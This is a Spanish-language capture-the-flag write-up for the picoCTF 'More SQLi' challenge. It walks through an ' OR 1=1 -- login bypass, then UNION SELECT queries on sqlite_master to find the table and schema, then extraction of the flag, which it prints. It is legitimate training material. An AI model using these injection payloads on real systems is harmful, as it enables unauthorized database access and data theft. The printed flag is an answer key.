## RETO
More SQLi
## DESCRIPCION
Can you find the flag on this website. Try to find the flag [here](http://saturn.picoctf.net:53173/).
## SOLUCION
1. En el artículo, el autor usa una variante para saltar la autenticación. Se pone esto en los campos:

- **Username:** `admin`

- **Password:** `' OR 1=1 --`


 **¿Por qué esto?** Esto hace que la consulta sea siempre verdadera y te deje entrar a la siguiente fase (la tabla de búsqueda).

2. Buscar el nombre de la Tabla

Una vez dentro, se ve una barra de búsqueda. Ahí es donde ocurre la magia de la **enumeración**. El autor usa este comando para ver qué tablas existen en la base de datos:

`' UNION SELECT 1,2,name FROM sqlite_master WHERE type='table'--`

- **El objetivo:** Encontrar una tabla que no sea "users". En el artículo, verás que aparece una tabla llamada algo como `more_sqli`.

3. Buscar las Columnas

Ya que se sabe el nombre de la tabla , necesitamos saber cómo se llama la columna que guarda la flag:

`' UNION SELECT 1,2,sql FROM sqlite_master WHERE type='table' AND name='more_table'--`

- **Qué buscar:** El resultado te mostrará el comando `CREATE TABLE` de esa tabla. Ahí verás el nombre de la columna (por ejemplo, `flag`).

==ME SALE CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)==

4. El Comando Final

Escribir esto exactamente en el campo de búsqueda:

`' UNION SELECT 1, 2, flag FROM more_table --`

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}
## NOTAS ADICIONALES
1. Hallazgos de Enumeración
• Motor de Base de Datos: Se identificó el uso de SQLite mediante la consulta a la tabla maestra `sqlite_master`.

• Estructura de la Tabla: La tabla de interés se denomina `more_table`.

• Esquema de la Tabla: La tabla contiene las columnas `id` (INTEGER, PRIMARY KEY) y `flag` (TEXT).

  • Sentencia de creación: `CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`.

2. Metodología de Explotación
• Bypass de Autenticación: Se utilizó la lógica `OR 1=1` para evadir la validación de credenciales en el formulario de inicio de sesión.

• Inyección Basada en UNION:

• Se determinó que la consulta original esperaba 3 columnas.

• Se emplearon valores de relleno (placeholders) para igualar el número de columnas: `' UNION SELECT 1, 2, [columna] FROM [tabla] --`.

• Extracción de Datos: El comando final para obtener la bandera fue `' UNION SELECT 1, 2, flag FROM more_table --`.

3. Conceptos Clave Aplicados
• Comentarios SQL: Uso de `--` para anular el resto de la consulta original del servidor.

• Manejo de Comillas: Cierre manual de cadenas de texto con `'` para inyectar comandos personalizados.

## REFERENCIAS
https://medium.com/@ahmednarmer1/ctf-day-33-aef2b1477fa5